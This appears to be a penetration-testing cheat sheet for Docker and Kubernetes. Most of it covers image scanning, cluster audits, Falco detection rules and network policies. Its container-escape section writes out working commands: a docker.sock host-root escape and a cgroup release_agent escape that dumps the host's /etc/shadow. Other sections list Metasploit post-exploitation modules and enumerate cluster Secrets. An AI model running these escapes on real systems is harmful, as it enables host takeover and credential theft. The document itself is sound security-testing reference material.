# Container Security Payloads

> Container security testing attack payloads, organized by category. All commands are for authorized security testing only.

---

## 1. Docker Image Analysis

### Trivy Scanning

```bash
# Scan image vulnerabilities - identify known CVEs
trivy image nginx:latest

# Filter by severity level
trivy image --severity HIGH,CRITICAL alpine:3.18

# Scan local file system (check Dockerfile, K8s manifests)
trivy fs /path/to/project

# Scan K8s configuration files
trivy config ./k8s-manifests/

# Output JSON format for automated processing
trivy image --format json --output results.json target:latest

# SBOM generation and scanning
trivy image --format sbom --output sbom.json target:latest
```

### Dockle Image Best Practice Checks

```bash
# Check if image follows best practices (e.g., not running as root, no sensitive files)
dockle nginx:latest

# Specify exit code level
dockle --exit-code 1 --exit-level warn target:latest

# Output JSON format
dockle --format json target:latest
```

### Dive Image Layer Analysis

```bash
# Analyze image layer contents, discover large files, sensitive files, and redundant layers
dive nginx:latest

# CI mode - check image efficiency score
dive --ci target:latest

# Ignore order for efficiency scoring
dive --ignore-order target:latest
```

### Grype Vulnerability Scanning

```bash
# Quick vulnerability scan
grype nginx:latest

# Scan from SBOM file
grype sbom:./sbom.json

# Show only specific severity levels
grype nginx:latest --only fixed
```

---

## 2. Container Escape Techniques

### Environment Detection

```bash
# Detect if currently running inside a container
cat /proc/1/cgroup | grep -q docker && echo "IN CONTAINER"
ls -la /.dockerenv 2>/dev/null && echo "DOCKER ENV"

# Check privileged mode - if cap_effective contains all capabilities
capsh --print

# Check sensitive mount points
mount | grep -E "docker.sock|proc|sysfs|dev"
ls -la /var/run/docker.sock 2>/dev/null
```

### Docker Socket Escape

```bash
# Create privileged container on host via mounted docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host

# Direct API operation
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"]}'
```

### Privileged Container Escape

```bash
# cgroup release_agent escape (requires privileged mode)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Kernel Vulnerability Exploitation

```bash
# Check kernel version
uname -r

# Search for kernel privilege escalation vulnerabilities
searchsploit linux kernel $(uname -r | cut -d- -f1) privilege escalation

# Metasploit container detection module
use post/linux/gather/checkcontainer
run
use post/linux/gather/enum_containers
run post/linux/gather/enum_containers SESSION=1 CMD="env"
```

---

## 3. Kubernetes Security Testing

### kubectl Information Enumeration

```bash
# Enumerate cluster role bindings - discover over-privileged assignments
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -n default -o wide

# Check ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default

# Check Secrets mounted by Pods
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.serviceAccountName}{"\n"}{end}'

# Enumerate all Secrets
kubectl get secrets --all-namespaces
kubectl get secret -o yaml <secret-name>

# Enumerate Pods and their security contexts
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'
```

### kubeaudit Automated Audit

```bash
# Comprehensive security audit
kubeaudit all -n default

# Check privileged containers
kubeaudit privileged -n kube-system

# Check if running as non-root
kubeaudit runasnonroot --all-namespaces

# Check for mounted docker.sock
kubeaudit automountserviceaccounttoken --all-namespaces
```

### kube-bench CIS Compliance

```bash
# Kubernetes CIS Benchmark - Master node
kube-bench master

# Kubernetes CIS Benchmark - Worker node
kube-bench node

# Check both Master and Node
kube-bench run --targets master,node

# Output JSON format
kube-bench master --json > kube-bench-results.json
```

---

## 4. Container Runtime Security

### Container Configuration Checks

```bash
# Check if container is running in privileged mode
docker inspect --format '{{.HostConfig.Privileged}}' <container>

# Check Linux capabilities added to container
docker inspect --format '{{json .HostConfig.CapAdd}}' <container>

# Check host directories mounted into container
docker inspect --format '{{json .HostConfig.Binds}}' <container>

# Check container user mapping
docker inspect --format '{{json .Config.User}}' <container>

# List running processes inside container
docker top <container>
```

### Falco Runtime Rules

```yaml
# Detect shell execution inside container
- rule: Terminal Shell in Container
  desc: A shell was spawned in a container
  condition: spawned_process and container and proc.name in (bash, sh, zsh)
  output: "Shell spawned in container (user=%user.name container=%container.name shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)"
  priority: WARNING

# Detect sensitive file reads
- rule: Read Sensitive File
  desc: Attempt to read sensitive file in container
  condition: open_read and container and fd.name in (/etc/shadow, /etc/passwd)
  output: "Sensitive file read (user=%user.name container=%container.name file=%fd.name)"
  priority: CRITICAL

# Detect container escape indicators
- rule: Container Escape via Mount
  desc: Write to docker.sock detected in container
  condition: open_write and container and fd.name contains /var/run/docker.sock
  output: "Potential container escape (user=%user.name container=%container.name file=%fd.name)"
  priority: CRITICAL
```

---

## 5. Registry Security

```bash
# Detect unauthenticated Docker Registry
curl -s http://<registry-ip>:5000/v2/_catalog
curl -s http://<registry-ip>:5000/v2/<image>/tags/list

# Enumerate image list in Registry
curl -s http://<registry-ip>:5000/v2/_catalog | jq .

# Get image manifest (includes history layers and configuration)
curl -s http://<registry-ip>:5000/v2/<image>/manifests/<tag> \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json"

# Download image layer files to check sensitive content
curl -s http://<registry-ip>:5000/v2/<image>/blobs/<digest> -o layer.tar

# Use trivy to scan remote Registry
trivy image --username <user> --password <pass> <registry>/<image>:<tag>
```

---

## 6. Network Policy Testing

```bash
# List current Network Policies
kubectl get networkpolicies --all-namespaces

# Test inter-Pod network connectivity (should be reachable without policies)
kubectl exec -it <pod> -- curl -s http://<target-pod-ip>:<port>

# Deploy default deny-all ingress Network Policy
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
EOF

# Deploy policy allowing specific labeled Pods
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
      protocol: TCP
EOF

# Verify policy enforcement
kubectl exec -it <frontend-pod> -- curl -s http://<backend-ip>:8080
kubectl exec -it <other-pod> -- curl -s --max-time 3 http://<backend-ip>:8080
```

---

## 7. Secret Detection in Images

```bash
# Use trivy to scan for secrets and sensitive information in images
trivy image --scanners secret nginx:latest

# Use truffleHog to scan Docker images
trufflehog docker --image nginx:latest

# Search for hardcoded secrets in image layers
docker history --no-trunc nginx:latest 2>/dev/null | grep -iE "password|secret|token|key|api"

# Export image layers and search for sensitive files
docker save nginx:latest -o image.tar
tar xf image.tar
find . -name "layer.tar" -exec sh -c 'tar tf "$1" | grep -iE "\.env|secret|password|\.pem|\.key"' _ {} \;
```

---

## 8. Privilege Escalation in Containers

```bash
# Check current user and capabilities
id
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# Check sudo configuration
sudo -l 2>/dev/null

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check writable sensitive paths
find / -writable -type d 2>/dev/null | grep -E "etc|var|opt|tmp"

# Check kernel module loading capability
cat /proc/sys/kernel/modules_disabled

# Check seccomp configuration status
cat /proc/self/status | grep Seccomp
```
